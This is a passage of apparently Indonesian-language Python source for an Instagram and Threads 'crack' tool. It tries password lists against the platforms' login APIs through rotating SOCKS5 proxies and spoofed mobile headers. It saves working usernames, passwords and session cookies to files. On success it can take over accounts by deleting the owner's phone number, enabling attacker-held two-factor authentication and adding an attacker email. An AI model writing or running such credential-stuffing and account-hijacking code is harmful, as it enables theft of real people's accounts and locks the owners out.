                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://i.instagram.com/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi(username, password)
        self.looping+=1
        
    def ExecApi_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                data = {'signed_body': '7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.{""id"":""{str(str(uuid.uuid4()))}"",""server_config_retrieval"":""1"",""experiments"": ""ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left""}','ig_sig_key_version': '4'}
                curl = byps.get('https://www.threads.net/api/v1/qe/sync/', data = data, allow_redirects=True)
                headers = {
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                    'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': random.choice(['Fw==','3brTv10=','3brTvw8=','3brTvwM=']),
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': Useragent().useragent_api(),
                    'accept-language': 'id-ID, en-US',
                    'x-bloks-is-layout-rtl': 'false',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'www.instagram.com',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'connection': 'keep-alive',
                    'cookie': ("";"").join([ ""%s=%s"" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecApi_Threads(username, password)
        for passwd in password:
            try:
                hash = hashlib.md5()
                hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
                hex_ = hash.hexdigest()
                hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))          
                payload = json.dumps({
                    'phone_id': str(uuid.uuid4()),
                    '_csrftoken': curl.cookies.get('csrftoken',None),
                    'username': username,
                    'guid': str(uuid.uuid4()),
                    'device_id': 'android-'+str(uuid.uuid4()),
                    'enc_password': Requre().enc_password(passwd),
                    'login_attempt_count': '0',
                    }
                )    
                encode = (f'signed_body=7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.'+urllib.parse.quote(payload)+'&ig_sig_key_version=4')
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/accounts/login/', data = encode, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'logged_in_user' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break   
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)                  
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecApi_Threads(username, password)
        self.looping+=1
            
    def ExecAjax(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.instagram.com/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='red')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'https://i.instagram.com/challenge/' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged challenge                ',style='yellow')
                    true = tree.add(f'Gagal logged {fullname}')
                    true.add(f'Username {username}')
                    true.add(f'Password {passwd}')
                    true = tree.add(f'\r╭ informasi profiles',style='yellow')
                    true.add(f'Followers {follower}')
                    true.add(f'Following {followed}')
                    true.add(f'Postingan {feedpost}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response):
                    Console().print(f""[bold grey50]   ──>[bold red] HIDUPKAN MODE PESAWAT 5 DETIK!"", end='\r')
                    time.sleep(3.5)     
                else:
                    continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(31)
                self.ExecAjax(username, password)
        self.looping+=1
        
    def ExecAjax_Threads(self, username, password):
        byps = requests.Session()
        try: Console().print(f""[bold grey50]   ──>[bold white] Crack[bold green] {str(username)[:15]}[bold grey50]/[bold white]{'{:.0%}'.format(self.looping/float(len(dump)))}[bold grey50]/[bold white]{str(len(dump))}[bold grey50]/[bold white]{self.looping}[bold grey50]/[bold white] OK:-[bold green]{self.success}[bold white] CP:-[bold red]{self.chekpoint}[bold white] 2F:-[bold red]{self.faktor}[bold white]     "", end='\r')
        except (ZeroDivisionError) as e:
            Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
            time.sleep(3.5)
        while True:
            try:
                curl = byps.get('https://www.threads.net/accounts/onetap/?next=%2F&hl=en', allow_redirects=True)
                headers = {
                    'Host': 'www.instagram.com',
                    'content-length': str(random.randint(2000,2999)),
                    'x-ig-app-id': '1217981644879628',
                    'x-instagram-ajax': '1011794706',
                    'user-agent': Useragent().useragent_ajax(),
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'x-asbd-id': '129477',
                    'dpr': '2',
                    'x-csrftoken': curl.cookies.get('csrftoken',None),
                    'accept': '*/*',
                    'origin': 'https://www.threads.net',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.threads.net/?hl=en',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'en-US;q=0.8,en;q=0.9'
                }
                break
            except (requests.exceptions.ConnectionError):
                Console().print(f""[bold grey50]   ──>[bold red] KONEKSI ERROR!"", end='\r')
                time.sleep(5)
                self.ExecApi(username, password)
            except (Exception) as e:
                Console().print(f""[bold grey50]   ──>[bold red] {str(e).upper()}!"", end='\r')
                time.sleep(3.5)
                self.ExecAjax_Threads(username, password)
        for passwd in password:
            try:          
                payload = {
                    'enc_password': Requre().enc_password(passwd),
                    'optIntoOneTap':'false',
                    'queryParams':json.dumps({""hl"":""en""}),
                    'trustedDeviceRecords':'{}',
                    'username': username,
                }
                proxs = {'http': 'socks5://'+random.choice(Requ().Socksku())}
                response = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, proxies = proxs, allow_redirects=True).text
                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
                if 'userId' in str(response):
                    self.success+=1
                    try: cookie = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
                    except (Exception) as e: cookie = (None)
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    if 'ya' in self.amankan_akun:
                        try:
                            #RePassd  = Require().RePassword(passwd, ''.join(str(random.choice('abcdefghij@kdddez_-sess_-trrffrdd')) for i in range(8)), cookie)
                            #OnRd = f'{passwd}' if RePassd is None else f'{RePassd}'
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} Di Hapus' if statp is True else f'{pone} Tidak Di Hapus'
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'Di Aktifkan' if statf is not False else 'Tidak Aktif'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'Di Konfirmasi' if state is True else 'Tidak Di Konfirmasi'
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            true = tree.add(f'\r╭ auth secure account',style='green')
                            true.add(f'stats two {stat2fa}')
                            true.add(f'screetkey {key}')
                            true.add(f'pemulihan {kode}')  
                            true.add(f'telephone {deleted}')   
                            true.add(f'add email {email} {statd}')
                            true.add(f'web email {inbx}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree(f'\r╭ logged in user',style='green')
                            true = tree.add(f'Succes logged {fullname}')
                            true.add(f'Username {username}')
                            true.add(f'Password {passwd}')
                            true = tree.add(f'\r╭ informasi profiles',style='green')
                            true.add(f'Followers {follower}')
                            true.add(f'Following {followed}')
                            true.add(f'Postingan {feedpost}')
                            tree.add(f'Cookie {cookie}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    else:
                        tree = Tree(f'\r╭ logged in user',style='green')
                        true = tree.add(f'Succes logged {fullname}')
                        true.add(f'Username {username}')
                        true.add(f'Password {passwd}')
                        true = tree.add(f'\r╭ informasi profiles',style='green')
                        true.add(f'Followers {follower}')
                        true.add(f'Following {followed}')
                        true.add(f'Postingan {feedpost}')
                        tree.add(f'Cookie {cookie}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n'
                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break       
                elif 'two_factor_required' in str(response):
                    try: fullname, follower, followed, feedpost = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r╭ logged two factor                ',style='red')
